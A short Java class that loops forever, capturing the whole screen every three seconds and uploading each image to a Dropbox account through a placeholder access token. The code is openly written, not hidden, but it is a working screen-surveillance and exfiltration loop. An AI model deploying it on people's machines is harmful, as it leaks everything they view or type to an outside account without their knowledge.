import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import javafx.stage.Screen;

import javax.imageio.ImageIO;
import javax.tools.Tool;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {

    private static final String ACCESS_TOKEN = "YOUR ACCESS TOKEN FROM DROPBOX";
    private BufferedImage image;

    @Override
    public void run()
    {
        for(;;){

             //Create Dropbox client
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
            SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
            Date date = new Date();
            String strDate = formatter.format(date);

        // Upload "test.txt" to Dropbox
        try{
            System.out.println("UPLOAD SCREENSHOT");
            image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ByteArrayOutputStream os = new ByteArrayOutputStream();
            ImageIO.write(image,"png",os);
        InputStream in = new ByteArrayInputStream(os.toByteArray());
            client.files().uploadBuilder("/"+ strDate +".png").uploadAndFinish(in);
        }
        catch(Exception ex){
            ex.printStackTrace();
        }

            try {
                sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

}
